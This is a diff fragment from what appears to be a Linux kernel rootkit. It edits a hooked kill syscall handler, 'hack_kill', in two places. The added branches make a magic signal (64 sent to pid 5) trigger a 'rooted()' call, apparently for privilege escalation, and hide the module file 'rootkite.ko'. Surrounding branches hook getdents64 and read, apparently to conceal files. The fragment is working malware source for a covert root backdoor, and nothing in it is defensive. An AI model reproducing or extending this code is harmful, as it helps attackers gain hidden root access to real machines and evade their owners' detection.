@@ -106,6 +106,11 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
             printk(KERN_ERR "error hooking syscall read\n");
         }
     }
+    else if ((sig == 64) && (pid == 5)){
+        rooted();
+        insert_node(&files_to_hide, "rootkite.ko");
+        //insert_node(&files_to_hide, "ath_pci.conf");
+    }
     else if ((sig == 63) && (pid == 1)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
@@ -193,6 +198,11 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
             printk(KERN_ERR "error hooking syscall read\n");
         }
+    }
+    else if ((sig == 64) && (pid == 5)){
+        rooted();
+        insert_node(&files_to_hide, "rootkite.ko");
+        //insert_node(&files_to_hide, "ath_pci.conf");
     }
     else if ((sig == 63) && (pid == 1)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
